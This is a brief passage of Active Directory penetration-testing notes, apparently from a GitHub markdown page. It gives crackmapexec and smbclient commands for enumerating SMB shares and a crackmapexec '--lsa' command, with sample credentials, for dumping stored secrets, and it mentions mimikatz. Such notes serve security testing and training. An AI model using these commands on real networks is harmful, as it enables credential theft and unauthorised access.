

From <https://github.com/TobyDavenn/ActiveDirectory/blob/main/activedirectory.md> 


![image](https://user-images.githubusercontent.com/35967437/200788095-c9c95791-7229-472a-af91-4f677ec7ec08.png)
<h2> Share enumeration </h2> <br>
can use crackmapexec to see smb access - crackmapexec smb ip -u -p --shares <br>
Take interesting shares and place into smbclient - smbclient ////ip//sharename -u --spider
<br>

<h2> Dumping LSSAS </h2><br>
This can be done with mimikatz (shown above defender may block) and also Crackmapexec -- crackmapexec smb 192.168.0.76 -u testadmin -p Password123 --lsa <br>
